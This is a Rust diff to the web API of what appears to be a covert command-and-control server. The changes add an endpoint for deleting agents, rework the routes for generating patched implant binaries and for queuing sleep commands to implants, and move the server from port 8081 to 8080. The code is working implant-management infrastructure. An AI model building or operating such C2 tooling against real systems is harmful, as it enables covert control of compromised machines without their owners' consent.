@@ -1,43 +1,38 @@
 use crate::{environment, patcher, workers::session, CHANNEL, GLOBAL_CONF, KEY, SESSIONS};
-use covert_c2_ping_common::{ClientConfig, PingMessage};
-use serde::Deserialize;
+use covert_c2_ping_common::{
+    ClientConfig, DeleteAgent, NewAgent, PatchAgent, PingMessage, SessionData,
+};
 use std::{
+    collections::HashMap,
     sync::atomic::{AtomicU16, Ordering},
     time::Duration,
 };
 use tokio::task;
 use warp::{http::Response, Filter, Rejection, Reply};
-#[derive(Deserialize, Debug)]
-pub struct NewAgent {
-    pub arch: String,
-    pub sleep: u64,
-    pub pipe: String,
-    pub host: String,
-}
-
-#[derive(Deserialize)]
-pub struct PatchAgent {
-    pub agentid: u16,
-    pub sleep: Option<u64>,
-}
 
 pub async fn web_worker() -> () {
     let patch = warp::patch()
         .and(warp::body::json::<PatchAgent>())
-        .and_then(update_agent);
+        .and_then(patch_agent);
+
     let get = warp::get().and_then(get_agent_list);
+
     let post = warp::post()
         .and(warp::body::json::<NewAgent>())
         .and_then(post_agent);
-    let api = warp::path!("api" / "agents").and(get.or(post).or(patch));
+
+    let delete = warp::delete()
+        .and(warp::body::json::<DeleteAgent>())
+        .and_then(delete_agent);
+    let api = warp::path!("api" / "agents").and(get.or(post).or(patch).or(delete));
     let root = warp::filters::fs::dir(environment::get_static_path());
-    warp::serve(api.or(root)).bind(([0, 0, 0, 0], 8081)).await;
+    warp::serve(api.or(root)).bind(([0, 0, 0, 0], 8080)).await;
 }
 
 static AGENT_COUNT: AtomicU16 = AtomicU16::new(1);
 
 async fn post_agent(new_agent: NewAgent) -> Result<impl Reply, Rejection> {
-    tracing::info!("{:?}", new_agent);
+    tracing::info!("New agent request");
     let (payload, connection) =
         covert_server::start_implant_session(&GLOBAL_CONF.ts, &new_agent.arch, &new_agent.pipe)
             .await
@@ -62,6 +57,7 @@ async fn post_agent(new_agent: NewAgent) -> Result<impl Reply, Rejection> {
 
     match patcher::get_patched_bin(req_conf, new_agent.arch).await {
         Ok(bin) => {
+            tracing::info!("Sending patched agent");
             let response = Response::builder()
                 .body(bin)
                 .or(Err(warp::reject::reject()))?;
@@ -69,22 +65,33 @@ async fn post_agent(new_agent: NewAgent) -> Result<impl Reply, Rejection> {
         }
         Err(e) => {
             tracing::info!("{:?}", e);
-            Err(warp::reject::reject())
+            Err(warp::reject())
         }
     }
 }
 
-async fn update_agent(config: PatchAgent) -> Result<impl Reply, Rejection> {
+async fn delete_agent(config: DeleteAgent) -> Result<impl Reply, Rejection> {
+    SESSIONS.lock().await.remove(&config.agentid);
+    Ok(warp::reply())
+}
+
+async fn patch_agent(config: PatchAgent) -> Result<impl Reply, Rejection> {
     if let Some(sleep) = config.sleep {
         CHANNEL.lock().await.put_message(
             PingMessage::SleepMessage(Duration::from_secs(sleep.into())),
             config.agentid,
         );
-    }
-    Ok(warp::reply())
+        return Ok(warp::reply());
+    };
+    Err(warp::reject())
 }
 
 async fn get_agent_list() -> Result<impl Reply, Rejection> {
-    let sessions = SESSIONS.lock().await;
-    Ok(warp::reply::json(&*sessions))
+    let sessions: HashMap<u16, SessionData> = SESSIONS
+        .lock()
+        .await
+        .iter()
+        .map(|(key, (_, val))| (key.clone(), val.clone()))
+        .collect();
+    Ok(warp::reply::json(&sessions))
 }
